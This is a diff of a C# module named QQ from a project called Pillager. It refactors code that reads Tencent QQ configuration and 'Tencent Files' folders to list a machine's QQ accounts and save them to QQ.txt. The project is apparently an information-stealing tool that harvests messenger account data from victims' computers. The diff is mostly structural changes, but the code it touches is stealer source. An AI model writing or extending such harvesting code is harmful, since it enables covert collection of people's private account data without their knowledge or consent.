@@ -6,13 +6,9 @@ using Pillager.Helper;
 
 namespace Pillager.Messengers
 {
-    internal class QQ
+    internal class QQ : ICommand
     {
-        public static string MessengerName = "QQ";
-
-
-
-        public static string GetCommonDocumentsFolder()
+        public string GetCommonDocumentsFolder()
         {
             int SIDL_COMMON_DOCUMENTS = 0x002e;
             StringBuilder sb = new StringBuilder();
@@ -20,7 +16,7 @@ namespace Pillager.Messengers
             return sb.ToString();
         }
 
-        public static string get_qq()
+        public string get_qq()
         {
             List<string> all = new List<string>();
             List<string> online = new List<string>();
@@ -30,7 +26,6 @@ namespace Pillager.Messengers
                 try
                 {
                     Pixini pixini = Pixini.Load(inifile);
-                    pixini.Save(inifile);
                     string type = pixini.Get("UserDataSavePathType", "UserDataSet", "1");
                     string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Tencent Files");
                     if (type == "2")
@@ -63,15 +58,15 @@ namespace Pillager.Messengers
             return sb.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string result = get_qq();
                 if (string.IsNullOrEmpty(result)) return;
-                string savepath = Path.Combine(path, MessengerName);
+                string savepath = Path.Combine(path, "QQ");
                 Directory.CreateDirectory(savepath);
-                File.WriteAllText(Path.Combine(savepath, "QQ.txt"), result);
+                File.WriteAllText(Path.Combine(savepath, "QQ.txt"), result, Encoding.UTF8);
             }
             catch { }
         }
